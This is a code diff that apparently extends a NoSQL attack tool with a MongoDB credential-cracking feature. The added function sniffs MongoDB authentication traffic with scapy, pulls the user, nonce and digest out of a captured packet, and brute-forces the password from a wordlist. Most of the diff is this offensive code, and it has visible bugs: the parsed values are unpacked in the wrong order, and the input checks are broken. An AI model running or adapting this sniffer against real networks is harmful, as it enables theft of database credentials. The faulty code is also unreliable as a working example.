@@ -31,8 +31,11 @@ import signal
 import ast
 import datetime
 import itertools
+import re
 from hashlib import md5
 from threading import Thread
+from scapy.all import *
+
 
 #Set a list so we can track whether options are set or not to avoid resetting them in subsequent cals to the options menu.
 global optionSet
@@ -72,6 +75,7 @@ def mainMenu():
 		print "2-NoSQL DB Access Attacks"
 		print "3-NoSQL Web App attacks"
 		print "4-Scan for Anonymous MongoDB Access"
+		print "5-Sniff and Crack MongoDB Password"
 		print "x-Exit"
 
 		select = raw_input("Select an option: ")
@@ -103,6 +107,9 @@ def mainMenu():
 				
 		elif select == "4":
 			massMongo()
+			
+		elif select == "5":
+			sniff_and_brute()
 
 		elif select == "x":
 			sys.exit()
@@ -397,7 +404,6 @@ def netAttacks(target):
 			print "MongoDB authenticated on " + target + ":27017!"
 			mgtOpen = True
 		except:
-			print str(sys.exc_info())
 			raw_input("Failed to authenticate.  Press enter to continue...")
 			return
 	
@@ -1724,10 +1730,89 @@ def getDBInfo():
 		crackHash = raw_input("Crack another hash (y/n)?")		
 	raw_input("Press enter to continue...")
 	return
+
+def sniff_and_brute():	
+ 	class sniff_and_brute(object):
+ 	    
+ 		def get_packets(self, port, iface, count):		
+ 			packets = sniff(filter="port "+str(port)+"", count=count, iface=str(iface))
+ 			return packets
+ 
+ 		def parse_packets(self, port, iface, count):
+ 			print "Sniff packages..."
+ 			packets = self.get_packets(port, iface, count)
+ 			print "Parse packages..."
+			
+ 			for i in xrange(len(packets)):
+ 				if "key" in re.findall(r'[A-Za-z0-9]{3,}', str(packets[i])):
+ 					packet=packets[i]
+ 					break
+ 			
+			user = re.findall(r'[A-Za-z0-9]{3,}', str(packet))[4]
+ 			nonce = re.findall(r'[A-Za-z0-9]{3,}', str(packet))[6]
+ 			key = re.findall(r'[A-Za-z0-9]{3,}', str(packet))[8]
+ 			return user, nonce, key
+ 		
+ 		def gen_pass(self, user, nonce, passw):	
+ 			return md5(nonce + user + md5(user + ":mongo:" + str(passw)).hexdigest()).hexdigest();
+ 
+ 
+ 		def brute_pass(self, port, iface, dictionary):
+ 			count = 10 # count of packets which should be sniffed
+ 			nonce, user, key = self.parse_packets(str(port), str(iface), int(count))
+ 			print "Prepair to brute..."
+ 			file = open(dictionary)
+ 			file_len = open(dictionary)
+ 			
+ 			for i in xrange(len(file_len.readlines())):
+ 				passw = file.readline().split('\n')[0]
+ 				
+ 				if self.gen_pass(user, nonce, passw) == key:
+ 					raw_input("\nFound - "+user+":"+passw)
+ 					break
+ 			exit
+ 		
+ 		def test(self):
+ 			self.test1("string")
+ 		def test1(self, string):
+ 			self.string = string
+ 			print string
+ 	
+ 
+ 	print "\nSniff and brute mongo password."
+ 	start = raw_input("Prepare to start (Y/N)? ")	
+ 	
+ 	if start == "y" or start == "Y":
+ 		next = raw_input("Port (default 27017): ")
+ 		if type(next) != int:
+ 			port = 27017
+ 		else:
+ 			port = next
+ 		next = raw_input("Interface to sniff: ")
+ 		if type(next) != str:
+ 			print "Error!"
+ 			exit
+ 		else:
+ 			iface=next
+ 			next= raw_input("Full path to dictionary for brute: ")
+ 		if type(next) != str:
+ 			print "Error!"
+ 			exit
+ 		else:
+ 			dictionary = next
+ 	else:
+ 		exit
+ 
+ 
+ 	start = raw_input("Start? (Y/N)")
+ 	if start == "y" or start == "Y":
+ 		sniff_brute = sniff_and_brute()
+ 		sniff_brute.brute_pass(port, iface, dictionary)
 	
 def signal_handler(signal, frame):
     print "\n"
     print "CTRL+C detected.  Exiting."
     sys.exit()
+
 signal.signal(signal.SIGINT, signal_handler)
 mainMenu()
